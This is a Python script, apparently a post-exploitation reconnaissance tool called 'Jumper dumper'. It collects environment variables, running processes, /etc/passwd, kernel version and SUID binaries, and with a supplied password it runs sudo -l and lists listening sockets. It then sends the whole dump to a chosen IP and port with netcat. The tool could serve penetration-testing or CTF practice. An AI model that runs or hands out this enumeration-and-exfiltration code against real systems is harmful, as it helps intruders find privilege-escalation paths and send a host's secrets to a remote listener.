import os
import sys
import ipaddress
import subprocess
import argparse

separator = " ========================================================================\n"
mid = "|------------------------------------------------------------------------|\n"

def main():
    finish3 = ''
    result = []

    commands = [
        'ps -aux',
        'env',
        'cat /proc/version',
        'cat /etc/passwd',
    ]
    finds = [
        'find / -perm -4000 2>/dev/null',
    ]
    sudos = [
        'ss -tulpn',
        'sudo -l',
    ]

    parser = argparse.ArgumentParser(description="Quick system scan")
    parser.add_argument("-i", "--ip", help="put destination ip address")
    parser.add_argument("-p", "--password", help="password for the account")
    parser.add_argument("-d","--destination",help="use to create file, no file by default")
    parser.add_argument("-l", "--port", help="specify port")
    args = parser.parse_args()

    if args.port: args.port = int(args.port)
    if args.destination:
        dst=args.destination
    else:
        dst=None

    if args.password is not None:
        check = subprocess.run("sudo -k -S -v", input=args.password, capture_output=True, text=True, shell=True)
        if check.returncode == 0:
            finish3 = sudofunc(sudos, args.password, separator, mid)
        else:
            print("Incorrect Password")
            sys.exit(1)

    to_send = postman(commands, separator, mid, result, finds, finish3)
    sender(to_send, args.ip, args.port, dst)

def postman(commands, separator, mid, result, finds, finish3):
    finish1 = str(default(commands, separator, mid, result)) + '\n'
    finish2 = str(looper(finds, separator, mid)) + '\n'
    return finish1 + finish2 + str(finish3)

def default(tab, s, m, result):
    cwd = os.getcwd()
    for command in tab:
        try:
            output = subprocess.check_output(command, text=True, shell=True, stderr=subprocess.STDOUT)
            effect = [command, output.strip()]
        except subprocess.CalledProcessError as e:
            effect = [command, e.output.strip()]

        result.append(f"{s}{2*m}{s}\n\nScript:{cwd}# {command}\n\n")
        result.append(str(effect[1]) + f"\n\n")
    return (''.join(result))

def looper(find, s, m):
    result = []
    cwd = os.getcwd()
    for command in find:
        effect = subprocess.run(command, capture_output=True, shell=True, text=True)
        result.append(f"{s}{2*m}{s}\n\nScript:{cwd}# {command}\n\n")

        tmp = effect.stdout.split()
        for e in tmp:
            t = subprocess.run(f"ls -l {e}", capture_output=True, shell=True, text=True)
            result.append(str(t.stdout).strip() + '\n')
        result.append("\n\n")
    return "".join(result)

def sudofunc(tab, p, s, m):
    result = []
    admin_prefix = "sudo -S -k "
    cwd = os.getcwd()

    for command in tab:
        full_cmd = admin_prefix + command
        try:
            output = subprocess.check_output(full_cmd, text=True, shell=True, input=p, stderr=subprocess.STDOUT)
            effect = [full_cmd, output.strip()]
        except subprocess.CalledProcessError as e:
            effect = [full_cmd, e.output.strip()]

        result.append(f"{s}{2*m}{s}\n\nScript:{cwd}# {full_cmd}\n\n")
        result.append(str(effect[1]) + f"\n\n")
    return "".join(result)

def sender(content, ip, port, dst):
    print("\n\t\t###---Jumper dumper---###\n" + content)


    if dst:
        print(f"saved to {dst}")
        with open(dst, 'w') as f:
            f.write(content)

    if ip is not None:
        try:
            ip_addr = ipaddress.ip_address(ip)
            if port and 0 < port < 65536:
                subprocess.run(["nc", "-v", "-q","0", str(ip_addr), str(port)], input=content, text=True)
                print(f"Sent to {ip_addr} on port {str(port)}")
            else:
                print('Invalid port, use range 0-65536')
        except ValueError:
            print("Incorrect IP, not sending")
    

if __name__ == "__main__":
    main()
